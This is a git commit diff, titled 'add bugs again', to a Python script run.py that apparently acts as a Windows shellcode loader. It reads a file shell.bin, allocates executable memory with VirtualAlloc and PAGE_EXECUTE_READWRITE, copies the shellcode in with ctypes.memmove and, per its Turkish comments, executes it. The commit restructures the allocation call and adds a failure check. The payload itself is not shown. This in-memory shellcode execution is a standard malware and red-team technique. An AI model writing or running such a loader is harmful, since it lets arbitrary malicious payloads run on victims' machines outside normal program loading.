307a968a23cee9d4835100bfaab50a3b7bfffc42
Lunix <cyln.elif1@gmail.com>
2024-09-22 13:08:56 +0300

    add bugs again

--- run.py
+++ run.py
@@ -16,8 +16,19 @@ shellcode_path = os.path.join(script_dir, "shell.bin")
 with open(shellcode_path, "rb") as f:
     shellcode = f.read()
 
-# Bellek ayırma ve shellcode'u yazma
-ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+# Bellek ayırma
+ptr = ctypes.windll.kernel32.VirtualAlloc(
+    None,
+    ctypes.c_size_t(len(shellcode)),
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE
+)
+
+# Bellek ayrılmadıysa hata mesajı ver
+if not ptr:
+    raise Exception("Bellek ayırma işlemi başarısız oldu.")
+
+# Shellcode'u belleğe yazma
 ctypes.memmove(ptr, shellcode, len(shellcode))
 
 # Shellcode'u çalıştırma
